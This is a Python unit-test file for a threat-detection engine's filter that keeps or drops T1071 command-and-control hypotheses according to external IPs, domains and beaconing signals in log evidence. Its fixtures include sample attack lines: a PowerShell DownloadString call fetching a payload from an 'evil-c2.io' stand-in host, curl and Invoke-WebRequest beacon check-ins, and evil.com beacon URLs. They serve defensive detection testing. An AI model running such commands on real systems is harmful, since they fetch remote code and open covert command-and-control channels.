"""
tests/test_nce_evidentiary_threshold.py

Unit tests for the T1071 evidentiary threshold filter added to
perception/nce_engine.py.

Tests cover:
1. T1071 with external IP + beaconing command → PASSES
2. T1071 with external IP only, no beaconing command → PASSES
3. T1071 with non-internal domain only, no IP, no command → PASSES
4. T1071 with NONE of the three signals → DROPPED
5. Non-T1071 hypothesis (T1550) with no signals → PASSES unchanged
6. Contract safety: filter reads ONLY the 6 allowed NCEInput evidence fields
"""

import pytest

from perception.nce_contract import (
    HypothesisStatus,
    NCEHypothesis,
)
from perception.nce_engine import (
    _apply_t1071_evidentiary_filter,
    _has_beaconing_command,
    _has_external_ip,
    _has_non_internal_domain,
    _is_private_ip,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_hypothesis(
    technique_id: str = "T1071",
    nce_confidence: float = 0.85,
    incident_id: str = "test-incident-001",
) -> NCEHypothesis:
    """Create a minimal valid NCEHypothesis for testing."""
    return NCEHypothesis(
        technique_id=technique_id,
        source_account="svc_test",
        source_host="WKSTN-001",
        target_host="SRV-DB-01",
        nce_confidence=nce_confidence,
        supporting_evidence_refs=["raw_log_line"],
        missing_context_flags=[],
        status=HypothesisStatus.GENERATED,
        incident_id=incident_id,
    )


# ---------------------------------------------------------------------------
# _is_private_ip tests
# ---------------------------------------------------------------------------

class TestIsPrivateIP:
    def test_rfc1918_10_range(self):
        assert _is_private_ip("10.0.0.1") is True
        assert _is_private_ip("10.255.255.255") is True

    def test_rfc1918_172_range(self):
        assert _is_private_ip("172.16.0.1") is True
        assert _is_private_ip("172.31.255.255") is True
        # 172.15.x.x is NOT private
        assert _is_private_ip("172.15.0.1") is False
        # 172.32.x.x is NOT private
        assert _is_private_ip("172.32.0.1") is False

    def test_rfc1918_192_168_range(self):
        assert _is_private_ip("192.168.0.1") is True
        assert _is_private_ip("192.168.255.255") is True

    def test_loopback(self):
        assert _is_private_ip("127.0.0.1") is True

    def test_link_local(self):
        assert _is_private_ip("169.254.1.1") is True

    def test_external_ip(self):
        assert _is_private_ip("185.41.181.108") is False
        assert _is_private_ip("8.8.8.8") is False
        assert _is_private_ip("1.2.3.4") is False

    def test_invalid_ip_failsafe(self):
        # Unparseable → treated as non-external (private)
        assert _is_private_ip("not-an-ip") is True
        assert _is_private_ip("999.999.999.999") is True


# ---------------------------------------------------------------------------
# _has_external_ip tests
# ---------------------------------------------------------------------------

class TestHasExternalIP:
    def test_external_ip_in_command_line(self):
        evidence = {
            "command_line": "curl.exe -s http://185.41.181.108:8443/checkin",
        }
        assert _has_external_ip(evidence) is True

    def test_only_private_ips(self):
        evidence = {
            "raw_log_line": "src=192.168.1.50 dst=10.0.0.1",
        }
        assert _has_external_ip(evidence) is False

    def test_no_ips_at_all(self):
        evidence = {
            "process_name": "outlook.exe",
            "file_path": "finance_export.xlsx",
        }
        assert _has_external_ip(evidence) is False


# ---------------------------------------------------------------------------
# _has_non_internal_domain tests
# ---------------------------------------------------------------------------

class TestHasNonInternalDomain:
    def test_external_cdn_domain(self):
        evidence = {
            "raw_log_line": "url=https://9821.example-cdn.net/asset",
        }
        assert _has_non_internal_domain(evidence) is True

    def test_duckdns_domain(self):
        evidence = {
            "raw_log_line": "host=abc123.duckdns.org",
        }
        assert _has_non_internal_domain(evidence) is True

    def test_evil_c2_domain(self):
        evidence = {
            "command_line": "powershell -c DownloadString('http://evil-c2.io/payload')",
        }
        assert _has_non_internal_domain(evidence) is True

    def test_internal_hostname_wkstn(self):
        evidence = {
            "raw_log_line": "target=WKSTN-9431",
        }
        assert _has_non_internal_domain(evidence) is False

    def test_internal_hostname_lt_corp(self):
        evidence = {
            "raw_log_line": "target=LT-6633-CORP",
        }
        assert _has_non_internal_domain(evidence) is False

    def test_internal_domain_suffix_corp_local(self):
        evidence = {
            "raw_log_line": "host=dc01.corp.local",
        }
        assert _has_non_internal_domain(evidence) is False

    def test_internal_domain_suffix_internal(self):
        evidence = {
            "raw_log_line": "host=SRV-FILE9832.internal",
        }
        assert _has_non_internal_domain(evidence) is False

    def test_usernames_in_paths_not_domain(self):
        evidence = {
            "file_path": r"C:\Users\a.patel\Documents\file_7813.tmp",
            "command_line": r"C:\Users\m.chen\AppData\Local\test.exe",
        }
        assert _has_non_internal_domain(evidence) is False

    def test_iso_timestamp_fragments_not_domain(self):
        evidence = {
            "raw_log_line": "[2024-06-13T21:35:46.000Z] category=Execution entity=File",
        }
        assert _has_non_internal_domain(evidence) is False

    def test_file_extensions_not_domain(self):
        evidence = {
            "process_name": "outlook.exe",
            "file_path": r"C:\Users\Public\Downloads\invoice.pdf.exe",
            "command_line": "tar -xf archive.zip",
        }
        assert _has_non_internal_domain(evidence) is False

    def test_no_domains(self):
        evidence = {
            "process_name": "svc_2558.exe",
        }
        assert _has_non_internal_domain(evidence) is False


# ---------------------------------------------------------------------------
# _has_beaconing_command tests
# ---------------------------------------------------------------------------

class TestHasBeaconingCommand:
    def test_curl_command(self):
        evidence = {
            "command_line": "curl.exe -s http://185.41.181.108:8443/checkin",
        }
        assert _has_beaconing_command(evidence) is True

    def test_invoke_webrequest(self):
        evidence = {
            "command_line": "Invoke-WebRequest -Uri http://185.x.x.x/beacon",
        }
        assert _has_beaconing_command(evidence) is True

    def test_category_c2(self):
        evidence = {
            "raw_log_line": "category=CommandAndControl action=blocked",
        }
        assert _has_beaconing_command(evidence) is True

    def test_beacon_path(self):
        evidence = {
            "raw_log_line": "url=http://evil.com/beacon",
        }
        assert _has_beaconing_command(evidence) is True

    def test_checkin_path(self):
        evidence = {
            "raw_log_line": "url=http://evil.com/checkin?id=1234",
        }
        assert _has_beaconing_command(evidence) is True

    def test_post_method(self):
        evidence = {
            "command_line": "Invoke-WebRequest -Method POST -Uri http://x",
        }
        assert _has_beaconing_command(evidence) is True

    def test_no_beaconing_signals(self):
        evidence = {
            "process_name": "outlook.exe",
            "file_path": "finance_export.xlsx",
            "raw_log_line": "category=Exfiltration action=allowed",
        }
        assert _has_beaconing_command(evidence) is False


# ---------------------------------------------------------------------------
# _apply_t1071_evidentiary_filter — integration tests
# ---------------------------------------------------------------------------

class TestApplyT1071EvidentiaryFilter:
    """Test the composite filter function."""

    def test_t1071_with_external_ip_and_beaconing_passes(self):
        """T1071 with external IP + beaconing command → PASSES."""
        h = _make_hypothesis("T1071", 0.85)
        evidence = {
            "command_line": "curl.exe -s http://185.41.181.108:8443/checkin",
            "raw_log_line": "category=CommandAndControl",
        }
        surviving, drops = _apply_t1071_evidentiary_filter([h], evidence)
        assert len(surviving) == 1
        assert surviving[0] is h
        assert len(drops) == 0

    def test_t1071_with_external_ip_only_passes(self):
        """T1071 with external IP only, no beaconing command → PASSES."""
        h = _make_hypothesis("T1071", 0.65)
        evidence = {
            "raw_log_line": "src=185.41.181.108 dst=10.0.0.5 action=allowed",
            "process_name": "svc_generic.exe",
        }
        surviving, drops = _apply_t1071_evidentiary_filter([h], evidence)
        assert len(surviving) == 1
        assert surviving[0] is h
        assert len(drops) == 0

    def test_t1071_with_non_internal_domain_only_passes(self):
        """T1071 with non-internal domain only, no IP, no command → PASSES."""
        h = _make_hypothesis("T1071", 0.65)
        evidence = {
            "raw_log_line": "url=https://9821.example-cdn.net/asset category=SuspiciousActivity",
            "process_name": "svc_1210.exe",
        }
        surviving, drops = _apply_t1071_evidentiary_filter([h], evidence)
        assert len(surviving) == 1
        assert surviving[0] is h
        assert len(drops) == 0

    def test_t1071_with_no_signals_dropped(self):
        """T1071 with NONE of the three signals → DROPPED."""
        h = _make_hypothesis("T1071", 0.42)
        evidence = {
            "process_name": "outlook.exe",
            "file_path": "archive_8000.zip",
            "raw_log_line": "category=Exfiltration target=LT-6633-CORP",
        }
        surviving, drops = _apply_t1071_evidentiary_filter([h], evidence)
        assert len(surviving) == 0
        assert len(drops) == 1
        assert "T1071 evidentiary threshold not met" in drops[0]

    def test_non_t1071_with_no_signals_passes(self):
        """Non-T1071 hypothesis (T1550) with no signals → PASSES unchanged."""
        h = _make_hypothesis("T1550", 0.80)
        evidence = {
            "process_name": "outlook.exe",
            "file_path": "archive_8000.zip",
            "raw_log_line": "category=Exfiltration target=LT-6633-CORP",
        }
        surviving, drops = _apply_t1071_evidentiary_filter([h], evidence)
        assert len(surviving) == 1
        assert surviving[0] is h
        assert len(drops) == 0

    def test_mixed_hypotheses_only_weak_t1071_dropped(self):
        """Mixed list: T1078, T1071 (weak), T1562 → only T1071 dropped."""
        h_t1078 = _make_hypothesis("T1078", 0.85)
        h_t1071 = _make_hypothesis("T1071", 0.35)
        h_t1562 = _make_hypothesis("T1562", 0.60)
        evidence = {
            "process_name": "outlook.exe",
            "file_path": "Q3_report.docm",
            "raw_log_line": "category=InitialAccess event_type=logon",
        }
        surviving, drops = _apply_t1071_evidentiary_filter(
            [h_t1078, h_t1071, h_t1562], evidence
        )
        assert len(surviving) == 2
        assert h_t1078 in surviving
        assert h_t1562 in surviving
        assert h_t1071 not in surviving
        assert len(drops) == 1

    def test_multiple_t1071_all_dropped_when_no_signals(self):
        """Multiple T1071 hypotheses all dropped when no signals present."""
        h1 = _make_hypothesis("T1071", 0.45)
        h2 = _make_hypothesis("T1071", 0.35)
        evidence = {
            "process_name": "svc_generic.exe",
            "raw_log_line": "category=Impact target=WKSTN-001",
        }
        surviving, drops = _apply_t1071_evidentiary_filter([h1, h2], evidence)
        assert len(surviving) == 0
        assert len(drops) == 2


# ---------------------------------------------------------------------------
# Contract safety: filter reads ONLY the 6 allowed evidence fields
# ---------------------------------------------------------------------------

class TestFilterContractSafety:
    """
    Verify the filter function's interface reads ONLY the evidence_fields
    dict and never accesses trusted_context or derived_context.
    """

    def test_filter_signature_takes_only_evidence_fields(self):
        """
        _apply_t1071_evidentiary_filter accepts (hypotheses, evidence_fields).
        evidence_fields is a plain dict[str, str] — the same shape as
        NCEInput.evidence_fields.  The function has no parameter for
        trusted_context, derived_context, or any ImmutableContext /
        DerivedContext object.
        """
        import inspect
        sig = inspect.signature(_apply_t1071_evidentiary_filter)
        param_names = list(sig.parameters.keys())
        assert param_names == ["hypotheses", "evidence_fields"], (
            f"Expected parameters ['hypotheses', 'evidence_fields'], "
            f"got {param_names}"
        )

    def test_filter_does_not_access_trusted_or_derived_context(self):
        """
        Pass a dict that only has the 6 allowed evidence field names.
        If the filter tried to access any trusted/derived context attribute,
        it would fail with KeyError or AttributeError.  This confirms the
        filter operates exclusively on the evidence_fields dict.
        """
        from perception.nce_contract import FORBIDDEN_FIELD_NAMES

        h = _make_hypothesis("T1071", 0.50)
        # Evidence dict with ONLY the 6 allowed fields
        evidence = {
            "process_name": "svc_test.exe",
            "command_line": "test.exe --flag",
            "registry_key": r"HKLM\Software\Test",
            "parent_process": "explorer.exe",
            "file_path": r"C:\temp\test.txt",
            "raw_log_line": "category=SuspiciousActivity",
        }

        # Verify no forbidden field names are in the evidence
        assert not (FORBIDDEN_FIELD_NAMES & evidence.keys()), (
            "Test evidence should not contain any forbidden field names"
        )

        # The filter should work with ONLY these 6 fields
        surviving, drops = _apply_t1071_evidentiary_filter([h], evidence)
        # With no external signals, this T1071 should be dropped
        assert len(drops) == 1
        assert len(surviving) == 0

    def test_filter_works_with_subset_of_evidence_fields(self):
        """
        The filter should work even if only some evidence fields are present
        (e.g. an alert with only process_name and raw_log_line).
        """
        h = _make_hypothesis("T1071", 0.50)
        evidence = {
            "process_name": "outlook.exe",
            "raw_log_line": "category=Exfiltration",
        }
        surviving, drops = _apply_t1071_evidentiary_filter([h], evidence)
        assert len(drops) == 1
        assert len(surviving) == 0

    def test_helper_functions_take_only_dict(self):
        """
        All three helper functions (_has_external_ip, _has_non_internal_domain,
        _has_beaconing_command) accept only a dict[str, str] — the same
        type as NCEInput.evidence_fields.
        """
        import inspect
        for fn in [_has_external_ip, _has_non_internal_domain, _has_beaconing_command]:
            sig = inspect.signature(fn)
            param_names = list(sig.parameters.keys())
            assert param_names == ["evidence_fields"], (
                f"{fn.__name__} expected parameter ['evidence_fields'], "
                f"got {param_names}"
            )
